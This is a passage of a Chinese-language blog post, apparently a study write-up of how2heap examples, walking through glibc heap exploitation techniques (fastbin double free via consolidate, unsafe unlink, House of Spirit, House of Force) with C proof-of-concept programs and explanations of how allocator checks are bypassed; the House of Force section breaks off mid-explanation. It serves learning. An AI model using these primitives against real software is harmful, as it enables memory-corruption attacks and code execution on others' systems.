+<p>还有一个问题是为什么stack变量要赋予0x20的初始值呢？这是为了伪造chunk的curSize部分，也就是我们常说的那3个bit的flag位，当然0x21也可以（0x21是理论上最正确的）</p>
+<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先malloc了两次，分配的地址分别为0x602000、0x602050两个，接着free第一个，此时的fastbin即为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
+<p>接着malloc了一个较大的内存空间，为0x6020b0，此时就是重点了。当glibc在分配一个large chunk时会检查是否存在fastbin，如果有的话，就会合并到unsortedbin中，再根据大小插入smallbin或者largebin，这就是所谓的consolidate。</p>
+<p>此时bin的状态如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin = []</span><br><span class="line">smallbin = [<span class="number">0x602000</span>]</span><br></pre></td></tr></table></figure>
+<p>由于0x602000不再fastbin的top了，所以又可以free了，这样0x602000就又到了fastbin里了，接下来再malloc</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fz9volw1hhj30f80ektcr.jpg" alt="image-20190117205810704"></p>
+<p>此时malloc先分配了fastbin中的0x602000，接着再malloc第二次</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9vp7x2wrj30ay0100ss.jpg" alt="image-20190117205859176"></p>
+<p>可以看到分配还是0x602000，这次分配的实际上是我们的smallbin里的</p>
+<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><p>了解这个首先需要复习一下基础的知识了，首先回顾一下chunk的结构：</p>
+<ul>
+<li><p>当我们的chunk被分配之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---------------------malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">-------------user data,size == malloc size --------------   &lt;--malloc return address</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>当我们的chunk free后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------free malloc chunk -----------------------</span><br><span class="line">-------- Size of previous chunk, if allocated  ----------</span><br><span class="line">---------Size of chunk, in bytes and 3 bit flags --------</span><br><span class="line">---------Forward pointer to next chunk in list ----------</span><br><span class="line">---------Back pointer to previous chunk in list ---------</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>第二个问题就是什么是unlink，unlink指的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。比如说图中三个chunk，我们现在要拿走p</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1fz9wejz57pj30e70bbmyp.jpg" alt="2"></p>
+<p>这时就有unlink操作了，其操作就是数据结构中学习的链表元素的删除</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk = p-&gt;bk</span><br><span class="line">p-&gt;bk-&gt;fd = p-&gt;fd</span><br></pre></td></tr></table></figure>
+<p>当然我们可以看看unlink的代码，它并不是这么无脑的就进行了，它还会进行检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &amp;&amp; P-&gt;bk-&gt;fd == P</span><br></pre></td></tr></table></figure>
+<p>当然这个检查我们非常容易绕过，我们的fd和bk都可以是非法的，只要fd-&gt;bk和bk-&gt;fd又指回了p就可以了</p>
+<p>了解了这些后我们就开始看代码了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序首先malloc了chunk0和chunk1，接下来对chunk0的offset2、3处做了赋值操作，根据上面的chunk结构我们很明显可以看出这是在user data里面选择了一片空间进行操作，它特意隔开了两个size，这两个size也就是一个正常的chunk所需的header部分，也就是说我们在伪造一个chunk（这个程序留出来的两个size真正的用处是实现该处地址的读写）。</p>
+<p>接下来程序修改了chunk1的内容，首先通过chunk1_ptr - header_size的方式找到了chunk1_header地址（这里的2实际上是2*sizeof(ptr)），接下来的任务就简单了，将prev_size改为我们malloc的size，而将chunk_size的后三位flag进行修改，将上一个chunk视为free可合并状态。</p>
+<p>如此，在free chunk1时，我们伪造的chunk0由于同样是free状态，就会发生合并，而合并的过程如下（以下的chunk0指我们伪造的chunk0，true_chunk是我们真的chunk0）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD == chunk0-&gt;fd == true_chunk - 3*size</span><br><span class="line">FD-&gt;bk == true_chunk </span><br><span class="line">true_chunk --&gt; chunk0</span><br></pre></td></tr></table></figure>
+<p>那也就是说，我们将chunk0设置为目的地址，也就是true_chunk[3]，就可以通过true_chunk[0]来修改里面的内容了，这也就是为什么最后程序成功修改了victim_string的原因。</p>
+<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>house_of_Spirit技术大概上讲的是将已经存在的指针指向我们伪造的chunk（可以位于堆栈、BSS段等等），之后欺骗glibc的相关检查，free进入bin</p>
+<p>由于how2heap上的代码有点太多了，所以这里我们用一个简单的demo先来学习一下，代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> pre_size;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fast_chunk</span> <span class="title">fake_chunks</span>[2];</span></span><br><span class="line"><span class="keyword">void</span> *ptr,*victim;</span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">fake_chunks[<span class="number">0</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">fake_chunks[<span class="number">1</span>].size=<span class="keyword">sizeof</span>(struct fast_chunk);</span><br><span class="line">ptr=(<span class="keyword">void</span> *)&amp;fake_chunks[<span class="number">0</span>].fd;</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">victim=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到首先我们在栈上分配了两个我们自己定义的chunk，接着malloc了真的，之后设置了自定义chunk的size的值，free了我们自定义的chunk，再次malloc时，我们会发现victim就是我们伪造的chunk了。</p>
+<p>那么问题来了，为什么我们在伪造chunk的时候只是设置了size部分呢？这就要读一下free相关的源码了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">public_fRE</span><span class="params">(Void_t* mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);    <span class="comment">//找到了mem的chunk地址</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))   <span class="comment">//检查chunk的mmp位</span></span><br><span class="line">    &#123;</span><br><span class="line">        munmap_chunk(p);       <span class="comment">//用unmmap的方式取消映射</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ar_ptr = arena_for_chunk(p);  <span class="comment">//找到chunk对应的area</span></span><br><span class="line">    ...</span><br><span class="line">    _int_free(ar_ptr, mem);       <span class="comment">//调用init_free（）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _int_free(mstate av, Void_t* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr p;</span><br><span class="line">    INTERNAL_SIZE_T size; </span><br><span class="line">    mfastbinptr* fb; </span><br><span class="line">    ...</span><br><span class="line">    p = mem2chunk(mem);   <span class="comment">//找到了mem的chunk</span></span><br><span class="line">    size = chunksize(p);   <span class="comment">//获得chunk的size</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast))    <span class="comment">//当前chunk的size字段的比较，不能超过fastbin的最大值</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">            || __builtin_expect(chunksize(chunk_at_offset(p, size))</span><br><span class="line">                                            &gt;= av-&gt;system_mem, <span class="number">0</span>))            <span class="comment">//比较下一个chunk的size字段，2*SIZE_ZE&lt;chunksize&lt;av-&gt;system_mem</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        fb = &amp;(av-&gt;fastbins[fastbin_index(size)]);</span><br><span class="line">        ...</span><br><span class="line">        p-&gt;fd = *fb;</span><br><span class="line">        *fb = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>试了一下这个简单的demo之后再去看how2heap上的代码就很简单了，同样是伪造chunk，不过就是伪造chunk的手段不一样（how2heap中运用了一个较大的数组人工划分了两个chunk）。</p>
+<p>还有一点就是两个例子中的size都不大，这是为了free后进入的是fastbin，前面free的源码中也表明了，如果你的size不够fastbin要求的话是根本没法触发之后的操作的。</p>
+<h2 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h2><p>主要是针对top chunk，通过修改top chunk来malloc任意地址</p>
+<p>还是先看源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss_var[] = <span class="string">"This is a string that we want to overwrite."</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Its current value is: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="keyword">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span>, real_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line">	<span class="keyword">intptr_t</span> *ptr_top = (<span class="keyword">intptr_t</span> *) ((<span class="keyword">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">	*(<span class="keyword">intptr_t</span> *)((<span class="keyword">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> evil_size = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)*<span class="number">4</span> - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_top;</span><br><span class="line">	<span class="keyword">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="keyword">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... old string: %s\n"</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">"YEAH!!!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... new string: %s\n"</span>, bss_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个例子的目的就是改写我们一开始的变量bss_var的值，首先我们malloc了p1，然后通过了计算得到了top的地址。这怎么算出来的呢？我们都知道malloc返回的地址并不是真正的chunk起始地址，而是chunk除去了chunk header的部分，所以我们先先去2*size得到chunk的真正地址，接着再算一下chunk的real size（也就是chunk实际用的大小加上chunk header的大小），二者相加就得到了top的地址。当然实际上算的时候没这么麻烦。。。那我们就可以构想一下了，假如我现在想要malloc返回任意的地址，以上述代码中的bss_var为例，那我的目标就是应该malloc时，top_chunk恰好等于我的地址，所以我们首先需要一个构造一个evil_size使得malloc(evil_Size)后我们的top chunk恰好到了我们想让它到的地方，而这个</p>
+<p>。。。。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/25/windows礼包/" rel="next" title="windows礼包">
+                <i class="fa fa-chevron-left"></i> windows礼包
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/01/windows安全保护机制-DEP浅析/" rel="prev" title="windows安全保护机制--DEP浅析">
+                windows安全保护机制--DEP浅析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Asa9ao</p>
+              <p class="site-description motion-element" itemprop="description">It's not who I am underneath, but it's what I do that defines me</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#first-fit"><span class="nav-number">1.</span> <span class="nav-text">first_fit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup"><span class="nav-number">2.</span> <span class="nav-text">fastbin_dup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-into-stack"><span class="nav-number">3.</span> <span class="nav-text">fastbin_dup_into_stack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin-dup-consolidate"><span class="nav-number">4.</span> <span class="nav-text">fastbin_dup_consolidate</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unsafe-unlink"><span class="nav-number">5.</span> <span class="nav-text">unsafe_unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Spirit"><span class="nav-number">6.</span> <span class="nav-text">House of Spirit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-force"><span class="nav-number">7.</span> <span class="nav-text">House of force</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Asa9ao</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
